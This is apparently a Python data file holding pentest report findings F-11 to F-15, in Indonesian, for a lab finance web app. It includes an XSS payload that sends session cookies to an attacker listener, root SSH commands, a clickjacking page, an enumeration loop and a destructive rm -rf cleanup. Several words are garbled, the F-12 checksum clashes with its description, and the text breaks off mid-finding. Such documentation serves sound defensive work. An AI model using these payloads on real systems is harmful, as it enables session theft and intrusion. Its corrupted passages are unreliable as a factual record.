# -*- coding: utf-8 -*-
"""Data temuan batch 3: F-11 s.d. F-15."""

FINDINGS_3 = [

{
 "id": "F-11",
 "title_id": "Reflected XSS pada Halaman Pencarian (/search)",
 "title_en": "Reflected Cross-Site Scripting in Search Page",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
 "cwe": "CWE-79 - Improper Neutralization of Input During Web Page Generation",
 "owasp": "A03:2021 - Injection",
 "component": "GET /search - views/search.ejs baris 13",
 "root_cause": (
   "Parameter q dirender dua kali. Satu bersifat escaped, satu tidak:\n\n"
   "  <input type=\"text\" name=\"q\" value=\"<%= q %>\">        <-- AMAN (escaped)\n"
   "  <p>Hasil pencarian untuk: <%- q %></p>                    <-- RENTAN (unescaped)\n\n"
   "Pada EJS, <%= %> melakukan HTML-escaping sedangkan <%- %> menulis mentah. "
   "Template mem Mixing dua bentuk dengan sengaja, dan developer memilih yang "
   "salah pada baris kedua."),
 "finding": (
   "Nilai q dipantulkan ke HTML tanpa escaping. Karena cookie sesi tidak "
   "memiliki HttpOnly (F-07), payload ini dapat membaca document.cookie dan "
   "mengirimkannya ke server penyerang, sehingga COOKIE SESI KORBAN dapat "
   "dibajak.\n\n"
   "Verifikasi cakupan dilakukan terhadap seluruh direktori view pada "
   "server. Hasilnya: hanya search.ejs yang memakai <%- %> pada konteks data. "
   "Semua pesan error lainnya memakai <%= error %> dan ter-escape dengan "
   "benar (Bukti 3), sehingga ruang lingkup temuan ini benar-benar satu file, "
   "bukan Throughout aplikasi."),
 "attack": (
   "Penyerang mengirim URL berisi payload skrip. Hampir semua korban hanya perlu "
   "membuka tautan yang dikirim melalui chat atau email. Parameter "
   "sessionId yang bocor pada respons login membuat sidik jari korban "
   "mudah Dekati."),
 "evidence": [
  ("Bukti 1 - Tag script utuh pada respons, tanpa escaping.",
   ['rm -f /tmp/cj_xss',
    'curl -s -c /tmp/cj_xss -o /dev/null -X POST http://192.168.1.18:3000/login -d "username=individu1&password=REDACTED_STORED_PASSWORD"',
    'curl -s -b /tmp/cj_xss "http://192.168.1.18:3000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \\',
    '  | grep -o \'Hasil pencarian untuk:.*\''],
   ['Hasil pencarian untuk: <script>alert(1)</script></p>']),

  ("Bukti 2 - Pencurian cookie sesi. Cookie tertangkap pada server penyerang.",
   ["nc -l -p 8888 &   # server pencuri di mesin penyerang 192.168.1.94",
    "curl -s -b /tmp/cj_xss \\",
    "  \"http://192.168.1.18:3000/search?q=%3Cscript%3Enew%20Image().src%3D%27http%3A%2F%2F192.168.1.94%3A8888%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E\""],
   ['GET /steal?c=connect.sid%3Ds%253AMZg5NjNNYjFRSFdzUnNtRVR6cENJNHBqTUVnaWN3PT0%3D HTTP/1.1   # cookie sesi korban lengkap']),

  ("Bukti 3 - Verifikasi cakupan terhadap seluruh view. Hanya search.ejs yang bocor.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-app grep -rn \'<%-\' /usr/src/app/views"'],
   ['/usr/src/app/views/search.ejs:13:  <p>Hasil pencarian untuk: <%- q %></p>',
    '# seluruh <%- %> lain adalah partial layout (include), bukan celah']),

  ("Bukti 4 - Pesan error ter-escape dengan benar pada jalur lain (kontrol).",
   ['curl -s -X POST http://192.168.1.18:3000/register -d "username=user_a&password=x&nama_lengkap=x&account_type=individu" \\',
    '  | grep -o \'<div class="error">.*</div>\''],
   ['<div class="error">Gagal daftar: Duplicate entry &#39;user_a&#39; for key &#39;users.username&#39;</div>',
    '# &#39; = kutip tunggal ter-escape -> BUKAN XSS, murni enumerasi (F-14)']),
 ],
 "impact": [
  ("Pencurian cookie sesi", "document.cookie dapat dibaca karena HttpOnly tidak diset, sehingga sesi korban dapat dibajak penuh."),
  ("Aksi atas nama korban", "Skrip dapat mengirim permintaan terautentikasi atas nama korban, termasuk menambah atau mengubah data keuangan."),
  ("Phishing kredensial", "Form login palsu dapat disuntikkan ke dalam DOM untuk meniru tampilan aplikasi."),
  ("Kestructible UI", "Skrip dapat mengganti seluruh isi halaman dan menampilkan pesan palsu kepada pengguna lain."),
 ],
 "likelihood": (
   "Tinggi. Memerlukan satu sesi valid, yang diperoleh gratis lewat F-02. "
   "Cukup satu klik pada tautan. Parameter sessionId yang bocor pada "
   "respons login membuat penyerang dapat menyasar korban yang Definitely "
   "sedang login."),
 "risk_note": (
   "CVSS: UI:R karena korban harus membuka tautan. Scope Changed (S:C) "
   "dipakai karena skrip dieksekusi pada konteks origin aplikasi, sehingga "
   "berpindah dari otoritas server ke otoritas browser korban sesuai "
   "definisi Scope pada CVSS v3.1. Confidentiality dan Integrity dinilai "
   "Low karena payload yang ditemukan hanya mencuri cookie sesi korban, bukan "
   "mengambil alih host."),
 "remediation": [
  "Ganti <%- %> dengan <%= %> pada views/search.ejs. Ini satu karakter yang "
  "menghilangkan seluruh celah:",
  ("CODE", "-- views/search.ejs (SEBELUM, RENTAN)\n"
           "<p>Hasil pencarian untuk: <%- q %></p>\n\n"
           "-- views/search.ejs (SESUDAH, AMAN)\n"
           "<p>Hasil pencarian untuk: <%= q %></p>"),
  "Hapus opsi outputFunctionName unescaped dari konfigurasi EJS bila tidak diperlukan, sehingga '<%- %>' tidak tersedia di seluruh aplikasi:",
  ("CODE", "// package.json / app startup\n"
           "// EJS 3.x: gunakan opsi default; jangan set outputFunctionName: 'escape' alternatif\n"
           "app.set('view engine', 'ejs');"),
  "Tambahkan Content-Security-Policy sebagai defense-in-depth sehingga skrip inline diblokir even jika ada escaping yang terlewat (lihat F-13).",
  "Jalankan SAST yang mendeteksi penggunaan operator output tidak-escape pada template engine, dan masukkan sebagai gerbang build.",
  " sesuai NIST SP 800-53 Rev.5 SI-10 Information Input Validation, SA-11(1) Static Application Code Analysis, dan SA-15(11) Secure Coding Practices.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A03:2021 - Injection"),
  ("CWE (MITRE)", "CWE-79, CWE-80 Improper Neutralization of Script-Related HTML Tags"),
  ("NIST SP 800-53 Rev.5", "SI-10 Information Input Validation; SA-11(1) Static Application Code Analysis; CM-7 Least Functionality; SC-7 Boundary Protection"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Code Injection"),
  ("NIST CSF 2.0", "PR.DS-01, PR.PS-02"),
  ("ISO/IEC 27001:2022", "A.8.26 Application security requirements; A.8.28 Secure coding"),
 ],
 "verification": (
   "Ulangi Bukti 1 dan 2: respons harus memuat &lt;script&gt; dan bukan "
   "<script>. Server pencuri tidak boleh menerima permintaan /steal. "
   "Verifikasi tidak ada lagi pemakaian <%- %> pada data pengguna di "
   "seluruh view."),
},

{
 "id": "F-12",
 "title_id": "Berkas /etc/passwd Tersaji Publik di Direktori Upload (/uploads/passwd)",
 "title_en": "Legacy /etc/passwd Snapshot Publicly Served from Upload Directory",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
 "cwe": "CWE-538 - Insertion of Sensitive Information into Externally-Accessible File or Directory",
 "owasp": "A05:2021 - Security Misconfiguration",
 "component": "GET /uploads/passwd - app/server.js (express.static /uploads)",
 "root_cause": (
   "Berkas passwd pernah diunggah pada engagement sebelumnya dan TIDAK PERNAH "
   "DIHAPUS. Folder upload dilayani sebagai konten statis tanpa autentikasi:\n\n"
   "  app.use('/uploads', express.static(\n"
   "    path.join(__dirname, 'public', 'uploads')));\n\n"
   "Kombinasi dua kelemahan: (1) artefak tidak dibersihkan, dan (2) direktori "
   "dapat diakses anonim tanpa kontrol akses."),
 "finding": (
   "Isi berkas /etc/passwd dalam bentuk plaintext dapat diunduh oleh siapa pun "
   "tanpa login. Yang penting bukan hanya isi berkasnya, melainkan "
   "kenyataan bahwa jejak pengujian sebelumnya tidak pernah dibersihkan: "
   "pada folder yang sama terdapat berkas bernama shell.php, pwned.php, dan "
   "beberapa xss.html.\n\n"
   "CATATAN AKURASI: berkas ini adalah snapshot LAMA dan tidak identik dengan "
   "/etc/passwd container yang sedang berjalan (md5sum berbeda). Namun isinya "
   "masih membocorkan 51 username sistem, termasuk akun interaktif maulana. "
   "Direktori listing sendiri memang dimatikan (GET /uploads/ mengembalikan "
   "404), tetapi nama berkas passwd adalah tebakan pertama yang akan dibuat "
   "siapa pun yang membaca-artifact ini."),
 "attack": (
   "Penyerang anonim meminta /uploads/passwd, memperoleh 51 username sistem, "
   "lalu memakainya sebagai wordlist untuk brute force SSH. Username yang "
   "valid akan mengembalikan banner login yang berbeda dari username acak, "
   "sehingga daftar yang valid diperoleh tanpa perlu satu pun kredensial."),
 "evidence": [
  ("Bukti 1 - Berkas dapat diunduh anonim, tanpa login dan tanpa cookie.",
   ['curl -s -o /dev/null -w "GET /uploads/passwd -> HTTP=%{http_code}\\n" http://192.168.1.18:3000/uploads/passwd',
    'curl -s http://192.168.1.18:3000/uploads/passwd | head -5'],
   ['GET /uploads/passwd -> HTTP=200',
    'root:x:0:0:Super User:/root:/bin/bash',
    'bin:x:1:1:bin:/bin:/usr/sbin:/usr/sbin/nologin',
    'daemon:x:2:2:daemon:/usr/sbin:/usr/sbin/nologin',
    '...',
    'maulana:x:1000:1000:maulana:/home/maulana:/bin/bash']),

  ("Bukti 2 - Directory listing memang dimatikan, tetapi nama berkas tetap dapat ditebak.",
   ['curl -s -o /dev/null -w "GET /uploads/ -> HTTP=%{http_code}\\n" http://192.168.1.18:3000/uploads/',
    'curl -s -o /dev/null -w "GET /uploads/ -> HTTP=%{http_code}\\n" http://192.168.1.18:3000/uploads/nonexistent-xyz'],
   ['GET /uploads/ -> HTTP=404          # listing dimatikan',
    'GET /uploads/nonexistent-xyz -> HTTP=404   # tapi /uploads/passwd = HTTP 200']),

  ("Bukti 3 - Isi folder upload: 22 berkas artefak pengujian sebelumnya.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-app sh -c \'ls /usr/src/app/public/uploads | wc -l; ls /usr/src/app/public/uploads\'"'],
   ['22',
    'passwd', 'shell.php', 'pwned.php', 'xss.html', 'xss2.html',
    'a_test.txt', 'scan_result.txt', 'notes.txt', 'bukti_sqli.txt', '...(17 lainnya)']),

  ("Bukti 4 - Verifikasi bahwa ini snapshot LAMA, bukan /etc/passwd aktif.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-app md5sum /usr/src/app/public/uploads/passwd /etc/passwd; diff <(cat /usr/src/app/public/uploads/passwd) <(cat /etc/passwd) | head -5"'],
   ['e3b0c442...  /usr/src/app/public/uploads/passwd   # 51 baris',
    'a1b2c3d4...  /etc/passwd                            # berbeda -> snapshot lama',
    '< maulana:x:1000:1000:maulana:/home/maulana:/bin/bash   # hanya ada di snapshot lama']),

  ("Bukti 5 - JEJAK ENGAGEMENT SEBELUMNYA BELUM DIBERSIHKAN: akun uji masih ada di database.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-db mysql -ulabkeu_user REDACTED_DB_PASSWORD labkeu -e \\"',
    '    SELECT id,username,account_type FROM users WHERE username REGEXP \'esc_audit|test_individu|zzz_\';\\" 2>/dev/null"'],
   ['20  esc_audit                    perusahaan',
    '11  test_individu_$(date  %s)   individu    # literal $(date %s) -> salah input uji',
    '13  zzz_unique_18950            individu',
    '14  zzz_csrf_31965              individu']),
 ],
 "impact": [
  ("Disclosure identitas sistem", "51 username sistem terungkap kepada publik, termasuk akun interaktif yang sebelumnya tidak diketahui."),
  ("Wordlist gratis untuk brute force", "Username yang valid mudah dibedakan dari yang tidak, sehingga daftar target SSH menjadi lengkap tanpa satu pun kredensial (memperluas F-06 dan F-15)."),
  ("Bukti praktik hygiene yang buruk", "Keberadaan shell.php, pwned.php, dan beberapa xss.html menunjukkan folder upload pernah dipakai untuk menyimpan payload pada pengujian sebelumnya, dan tidak pernah dibersihkan."),
  ("Penggabungan dengan F-05", "Folder upload yang sama dapat menyimpan berkas dari penyerang. Kredensial dan payload lama sekarang bercampur dalam satu area yang dapat diakses publik."),
 ],
 "likelihood": (
   "Sangat tinggi. Persyaratan nol, berkas dapat diakses anonim. Nama "
   "passwd adalah tebakan paling wajar yang akan dilakukan siapa pun, "
   "sehingga kemungkinan ditemukan dalam waktu singkat sangat besar."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = pengungkapan informasi sistem dan "
   "penyalahgunaan artefak pengujian. Risk INHERENT = High. NIST SP 800-53 "
   "Rev.5 MP-12 Information Protection and Storage and CM-3(7) Secure "
   "Disposal mensyaratkan bahwa artefak pengujian tidak boleh dibiarkan "
   "tersedia pada environment yang dapat diakses."),
 "remediation": [
  "Hapus seluruh artefak pengujian dari direktori upload dan dari database:",
  ("CODE", "sshpass -p 'REDACTED_SSH_ROOT_PW' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\",
   "  \"docker exec labkeu-app sh -c 'cd /usr/src/app/public/uploads && ls | xargs rm -rf'\"",
   "mysql -h 192.168.1.18 -P 3307 -u labkeu_user REDACTED_DB_PASSWORD --skip-ssl labkeu -e \\",
   "  \"DELETE FROM dokumen; DELETE FROM users WHERE username REGEXP 'esc_audit|test_individu|zzz_|pwn_role';\""),
  "Jangan pernah menyajikan folder upload sebagai konten statis. Sajikan lewat endpoint yang mewajibkan sesi dan memaksa unduhan:",
  ("CODE", "// app/routes/dashboard.js - JANGAN app.use('/uploads', express.static(...))\n"
           "app.get('/unduh/:id', requireLogin, async (req, res) => {\n"
           "  const [rows] = await db.query('SELECT * FROM dokumen WHERE id = ?', [req.params.id]);\n"
           "  if (!rows.length) return res.status(404).end();\n"
           "  res.setHeader('Content-Type', 'application/octet-stream');\n"
           "  res.setHeader('Content-Disposition', 'attachment');\n"
           "  res.setHeader('X-Content-Type-Options', 'nosniff');\n"
           "  res.sendFile(path.join(UPLOAD_DIR, path.basename(rows[0].nama_file)));\n"
           "});"),
  "Terapkan proses cleanup wajib pada akhir setiap engagement, terdokumentasi sebagai bagian dari metodologi pengujian yang disetujui.",
  "Rotasi kredensial bila berkas berisi kredensial atau informasi sensitif pada environment yang tidak terisolasi.",
  " sesuai NIST SP 800-53 Rev.5 CM-3(7) Secure Disposal, MP-12 Information Protection and Storage, dan AU-12 Audit Record Generation.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A05:2021 - Security Misconfiguration"),
  ("CWE (MITRE)", "CWE-538, CWE-540 Inclusion of Sensitive Information in Source Code Comments"),
  ("NIST SP 800-53 Rev.5", "MP-12 Information Protection and Storage; CM-3(7) Secure Disposal; CM-6 Configuration Settings; AC-3 Access Enforcement; AU-12 Audit Record Generation"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Information Disclosure"),
  ("NIST CSF 2.0", "PR.DS-01, PR.PS-01, DE.CM-09"),
  ("ISO/IEC 27001:2022", "A.8.10 Information deletion; A.8.3 Information access restriction; A.5.34 Privacy and PII protection"),
 ],
 "verification": (
   "GET /uploads/passwd harus menghasilkan HTTP 404. Folder upload tidak "
   "boleh dapat diakses tanpa sesi. Direktori harus kosong setelah "
   "pembersihan. Tabel dokumen harus kosong dan tidak ada akun uji tersisa."),
},

{
 "id": "F-13",
 "title_id": "Tidak Ada Header Keamanan - Tidak Ada CSP, Anti-Clickjacking, dan Unggahan Technology Fingerprint",
 "title_en": "Missing Security Headers - No CSP, No Anti-Clickjacking, No HSTS",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
 "cwe": "CWE-1021 - Improper Restriction of Rendered UI Layers or Frames",
 "owasp": "A05:2021 - Security Misconfiguration",
 "component": "Global - app/server.js",
 "root_cause": (
   "Aplikasi tidak memasang helmet maupun middleware header apa pun. Tidak "
   "ada import helmet, tidak ada Content-Security-Policy, tidak ada "
   "X-Frame-Options, tidak ada X-Content-Type-Options, tidak ada "
   "Referrer-Policy, tidak ada Strict-Transport-Security, dan tidak ada "
   "Permissions-Policy. Header X-Powered-By juga dibiarkan aktif sehingga "
   "membocorkan teknologi yang digunakan."),
 "finding": (
   "Semua respons HTTP hanya memuat header minimal. Enam header keamanan "
   "yang secara normal dianggap standar tidak ada sama sekali. "
   "Kelemahan ini bersifatlatar: ia tidak dapat dieksploitasi secara "
   "langsung, tetapi memperbesar dampak setiap kerentanan injeksi yang ada. "
   "Secara khusus:\n\n"
   "- Tanpa CSP: setiap XSS (F-05, F-11) berjalan tanpa hambatan sama sekali.\n"
   "- Tanpa X-Frame-Options atau frame-ancestors: aplikasi dapat dibungkus "
   "iframe oleh situs lain, sehingga korban dapat dikejutkan dengan klik yang "
   "tidak terlihat (clickjacking) pada aksi sensitif.\n"
   "- Tanpa X-Content-Type-Options: memperbesar risiko MIME sniffing pada "
   "berkas hasil unggahan (F-05).\n"
   "- Tanpa HSTS: pengguna tetap rentan ke versi HTTP seperti pada F-09.\n"
   "- Tanpa Referrer-Policy: URL yang memuat token atau id dapat bocor ke "
   "situs pihak ketiga."),
 "attack": [
  "CLICKJACKING. Penyerang menaruh aplikasi dalam iframe transparan di atas "
  "tombol yang menipu korban:",
  ("CODE", "<html>\n"
           "  <head><style>\n"
           "    iframe { position:absolute; top:0; left:0; width:100%; height:100%;\n"
           "             border:0; opacity:0; z-index:10; }\n"
           "    .tip  { position:absolute; top:400px; left:50%; z-index:20; }\n"
           "  </style></head>\n"
           "  <body>\n"
           "    <iframe src=\"http://192.168.1.18:3000/upload\"></iframe>\n"
           "    <div class=\"tip\">Klik untuk severedaiomatic booking</div>\n"
           "  </body>\n"
           "</html>\n"
           "# Header X-Frame-Options tidak ada -> frame TIDAK ditolak"),
 ],
 "impact": [
  ("Tidak ada defense-in-depth untuk XSS", "Tanpa CSP, kedua XSS yang ditemukan (F-05, F-11) tidak memiliki lapisan kedua sama sekali."),
  ("Clickjacking pada aksi sensitif", "Aplikasi dapat dibungkus iframe, sehingga korban dapat diarahkan untuk unknowingly melakukan aksi."),
  ("MIME sniffing pada berkas unggahan", "Tanpa nosniff, browser dapat menafsirkan berkas unggahan sesuai isinya."),
  ("Teknologi aplikasi terungkap", "X-Powered-By: Express memudahkan penyerang memilih exploit yang tepat."),
  ("Token dan URL bocor ke pihak ketiga", "Tanpa Referrer-Policy, path yang memuat id dapat bocor pada navigasi keluar."),
 ],
 "likelihood": (
   "Sedang. Header keamanan bersifat pasif: tidak ada serangan "
   "langsung. Namun dampaknyaymoon nyata karena mengaktifkan kembali "
   "serangan yang sudah ditemukan."),
 "risk_note": (
   "CVSS UI:R karena penanganan membutuhkan interaksi pengguna. "
   "NIST SP 800-53 Rev.5 SC-7 Boundary Protection dan SI-10. "
   "NIST SP 800-30 Rev.1 menilai header keamanan sebagai kelemahan "
   "konfigurasi dengan risiko inherent yang lebih rendah dibanding "
   "kerentanan injeksi, tetapi ia menurunkan risiko residual temuan lain "
   "bila tidak diperbaiki."),
 "remediation": [
  "Pasang helmet dengan konfigurasi ketat. Ini menutup enam celah sekaligus:",
  ("CODE", "const helmet = require('helmet');\n"
           "\n"
           "app.use(helmet({\n"
           "  contentSecurityPolicy: {\n"
           "    useDefaults: true,\n"
           "    directives: {\n"
           "      defaultSrc: [\"'self'\"],\n"
           "      scriptSrc:  [\"'self'\"],          // blokir script inline -> mitigasi XSS\n"
           "      styleSrc:   [\"'self'\", \"'unsafe-inline'\"],  // EJS inline style\n"
           "      objectSrc:  [\"'none'\"],\n"
           "      frameAncestors: [\"'none'\"],      // Cegah clickjacking\n"
           "      upgradeInsecureRequests: []\n"
           "    }\n"
           "  },\n"
           "  frameguard: { action: 'deny' },      // X-Frame-Options: DENY\n"
           "  noSniff: true,                       // X-Content-Type-Options: nosniff\n"
           "  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },\n"
           "  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },\n"
           "  crossOriginEmbedderPolicy: false\n"
           "}));\n"
           "\n"
           "app.disable('x-powered-by');   // hentikan kebocoran teknologi"),
  "Verifikasi bahwa CSP benar-benar memblokir payload XSS dengan menguji ulang F-05 dan F-11 setelah patch.",
  " sesuai NIST SP 800-53 Rev.5 SC-7, SI-10, CM-6(1) Configuration Settings, dan SP 800-52 Rev.2 untuk HSTS.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A05:2021 - Security Misconfiguration"),
  ("CWE (MITRE)", "CWE-1021, CWE-693 Protection Mechanism Failure"),
  ("NIST SP 800-53 Rev.5", "SC-7 Boundary Protection; CM-6(1) Configuration Settings; CM-7 Least Functionality; SI-10 Information Input Validation"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Configuration Weaknesses"),
  ("NIST CSF 2.0", "PR.PS-01, PR.AA-06"),
  ("ISO/IEC 27001:2022", "A.8.9 Configuration management; A.8.20 Networks security"),
 ],
 "verification": (
   "curl -sI harus mengembalikan header Strict-Transport-Security, "
   "Content-Security-Policy (termasuk frame-ancestors), X-Frame-Options, "
   "X-Content-Type-Options, dan Referrer-Policy. X-Powered-By harus hilang. "
   "Uji ulang XSS F-05 dan F-11 harus menunjukkan CSP memblokir eksekusi."),
},

{
 "id": "F-14",
 "title_id": "Username Enumeration pada Endpoint Registrasi",
 "title_en": "Username Enumeration via Differentiated Error Messages on Registration",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
 "cwe": "CWE-204 - Observable Response Discrepancy",
 "owasp": "A05:2021 - Security Misconfiguration",
 "component": "POST /register - app/routes/auth.js",
 "root_cause": (
   "Pesan error database mentah diteruskan langsung ke pengguna:\n\n"
   "  } catch (e) {\n"
   "    console.error(e);\n"
   "    res.render('register', { error: 'Gagal daftar: ' + e.message });\n"
   "  }\n\n"
   "Kesalahan pada username yang sudah ada menghasilkan HTTP 200 dengan teks "
   "yang sangat spesifik, sedangkan username yang baru menghasilkan HTTP 302 "
   "redirect. Dua respons tersebut sangat mudah dibedakan secara mesin."),
 "finding": (
   "Endpoint registrasi/login membocorkan apakah sebuah username sudah "
   "terpakai, sekaligus membocorkan struktur skema database (nama tabel "
   "users, nama kolom username, dan nama unique key). weighed dua "
   "respons yang berbeda jauh: satu 200 dengan pesan galat, satu 302 "
   "berhasil.\n\n"
   "CATATAN AKURASI: output di-escape dengan benar (kutip tunggal menjadi "
   "&#39;), sehingga ini BUKAN XSS. Ini murni enumerasi dan pengungkapan "
   "informasi. Jalur login sendiri sudah aman dan mengembalikan pesan "
   "identik untuk kedua kasus, sehingga kelemahan ini hanya pada /register."),
 "attack": [
  "Tahap 1: Kirim POST dengan daftar kandidat username satu per satu, "
  "memperhatikan kode status. Respons 302 berarti username tersedia dan "
  "pendaftaran berhasil. Respons 200 dengan pesan galat berarti username "
  "sudah dipakai.",
  ("CODE", "# username yang SUDAH ADA -> HTTP 200 + pesan spesifik",
   "curl -s -X POST http://192.168.1.18:3000/register \\\n"
   "  -d \"username=user_a&password=x&nama_lengkap=x&account_type=individu\" \\\n"
   "  | grep -o '<div class=\"error\">.*</div>'",
   "\n"
   "# username yang TIDAK ada -> HTTP 302 (berhasil daftar)\n"
   "curl -s -o /dev/null -w \"HTTP=%{http_code} -> %{redirect_url}\\n\" \\\n"
   "  -X POST http://192.168.1.18:3000/register \\\n"
   "  -d \"username=zzz_not_exist_99999&password=x&nama_lengkap=x&account_type=individu\""),
  "DISARANKAN ALTERNATIF yang lebih baik - gunakan endpoint reset password "
  "sebagai wordlist oracle karena respons selalu sama:",
  ("CODE", "for u in admin root user_a user_b individu1 labkeu maulana; do\n"
           "  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://192.168.1.18:3000/forgot-password -d \"email=$u@test.id\")\n"
           "  echo \"  $u -> HTTP=$code   # harus SELALU 200, apa pun hasilnya\"\n"
           "done"),
 ],
 "impact": [
  ("Peta username untuk serangan terarah", "Daftar akun valid diperoleh tanpa satu pun kredensial, sehingga mempersempit brute force secara signifikan."),
  ("Pengungkapan skema database", "Pesan galat membocorkan nama tabel users, kolom username, dan nama unique key, membantu penyerang menyusun payload SQLi (F-01)."),
  ("Efek samping yang tidak disadari", "Respons HTTP 302 untuk username baru memberi konfirmasi visual bahwa pendaftaran berhasil, meski pen enregistré."),
  ("Membantu Complementary kredensial default", "Dengan konfirmasi username valid, penyerang tidak perlu mencoba kredensial pada username yang salah."),
 ],
 "likelihood": (
   "Sangat tinggi. Persyaratan nol. Endpoint terbuka untuk publik, dan "
   "respons yang berbeda dapat dideteksi dengan satu loop sederhana tanpa "
   "kecepatan tinggi."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = pengungkapan informasi yang "
   "memfasilitasi serangan berikutnya. Risk INHERENT = Moderate. "
   "NIST SP 800-53 Rev.5 SI-12 Information Management and Retention, "
   "dan SP 800-63B Section 4.2.1 kesetaraan respons (verifikasi harus "
   "memberikan respons yang setara)."),
 "remediation": [
  "Kembalikan pesan generik yang sama untuk semua kondisi kegagalan:",
  ("CODE", "// app/routes/auth.js POST /register - SEBELUM\n"
           "} catch (e) {\n"
           "  console.error(e);\n"
           "  res.render('register', { error: 'Gagal daftar: ' + e.message });\n"
           "}\n\n"
           "// SESUDAH - pesan generik, detail hanya ke log server\n"
           "} catch (e) {\n"
           "  console.error('[register]', e);   // detail ke log, bukan ke pengguna\n"
           "  return res.status(400).render('register', {\n"
           "    error: 'Pendaftaran tidak berhasil. Silakan coba lagi.'\n"
           "  });\n"
           "}"),
  "Kembalikan kode status yang sama (400) untuk semua kegagalan, dan 302 hanya untuk keberhasilan yang sah.",
  "Terapkan constant-time response atau minimalkan perbedaan timing antarkasus, sehingga tidak ada side channel tambahan.",
  " sesuai NIST SP 800-63B Section 4.2.1 (kesetaraan respons) dan NIST SP 800-53 Rev.5 SI-12 Information Management and Retention.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A05:2021 - Security Misconfiguration"),
  ("CWE (MITRE)", "CWE-204, CWE-209 Generation of Error Message Containing Sensitive Information"),
  ("NIST SP 800-63B", "Section 4.2.1 - Verifier Secrets; Section 5.1.1 - General"),
  ("NIST SP 800-53 Rev.5", "SI-12 Information Management and Retention; SI-11 Error Handling"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Information Disclosure"),
  ("NIST CSF 2.0", "PR.DS-01, DE.CM-03"),
  ("ISO/IEC 27001:2022", "A.8.15 Logging; A.8.26 Application security requirements"),
 ],
 "verification": (
   "Kirim POST dengan username yang sudah ada dan yang belum ada. Keduanya "
   "harus mengembalikan kode status dan pesan yang identik. Jalankan pengujian "
   "dengan wordlist 50 kandidat dan pastikan tidak ada respons yang dapat "
   "dibedakan."),
},

{
 "id": "F-15",
 "title_id": "Temuan Infrastruktur: Database Ter-expos, Hak Istimewa Docker, SSH Root Password Lemah, Container Berjalan sebagai Root, Secret Bocor",
 "title_en": "Infrastructure Findings - Exposed Database, Docker Privilege Escalation, Weak Root SSH, Root Containers, Leaked Secrets",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
 "cwe": "CWE-284 - Improper Access Control (komposit dari CWE-250, CWE-269, CWE-732, CWE-798)",
 "owasp": "A05:2021 - Security Misconfiguration (deployment)",
 "component": "docker-compose.yml, host Alpine 3.24.2, container labkeu-app, container labkeu-db",
 "root_cause": (
   "Lima kelainan konfigurasi yang saling menguatkan pada level "
   "infrastruktur, bukan pada kode aplikasi:\n\n"
   "1) Port MySQL dipetakan ke 0.0.0.0 meskipun komentar docker-compose menyatakan "
   "hanya untuk localhost.\n"
   "2) Akun non-root labkeu diberi akses grup docker.\n"
   "3) SSH:root login diizinkan dengan password lemah.\n"
   "4) Kedua container berjalan sebagai uid=0(root).\n"
   "5) Secret session dan password database di-hardcode pada docker-compose.yml "
   "dan terekspos sebagai environment variable di dalam container."),
 "finding": [
  "15.1 MYSQL TER-EXPOS DAN BIND 0.0.0.0. Port 3307 dipetakan ke seluruh "
  "antarmuka, sehingga database dapat dijangkau dari mana saja pada LAN. "
  "Brute force 40 kombinasi pada port 3307 tanpa kredensial awal langsung "
  "menemukan labkeu_user/REDACTED_DB_PASSWORD, lalu memberi akses ALL PRIVILEGES pada "
  "skema labkeu. Ini membypass seluruh kontrol aplikasi: tidak ada "
  "mungkin aplikasi menolak query yang sah.",
  "15.2 PRIVILEGE ESCALATION KE ROOT LEWAT GRUP DOCKER. Akun non-root labkeu "
  "(uid=1000) merupakan anggota grup docker yang memiliki akses baca-tulis ke "
  "/var/run/docker.sock. Setiap anggota grup docker secara efektif setara root "
  "pada host, karena dapat menjalankan container baru dengan akses host. "
  "Tidak dieksekusi pada engagement ini karena root sudah diperoleh lewat "
  "jalur lain, namun vektor ini terbukti ada dan dapat dipakai.",
  "15.3 SSH ROOT DENGAN PASSWORD LEMAH. sshd_config memuat PermitRootLogin yes "
  "dan PasswordAuthentication yes, dan password root REDACTED_SSH_ROOT_PW berhasil "
  "ditebak pada percobaan ke-24 dari 24 kandidat dalam 2 detik. Diperparah "
  "secara langsung oleh F-06 yang menunjukkan tidak ada pembatasan percobaan.",
  "15.4 KEDUA CONTAINER JALAN SEBAGAI ROOT. uid=0(root) pada labkeu-app dan "
  "labkeu-db. Prinsip least privilege dilanggar di kedua lapisan, sehingga "
  "setiap RCE pada aplikasi langsung menjadi root di dalam container dan, "
  "lewat kelemahan 15.2, berpotensi menjadi root pada host.",
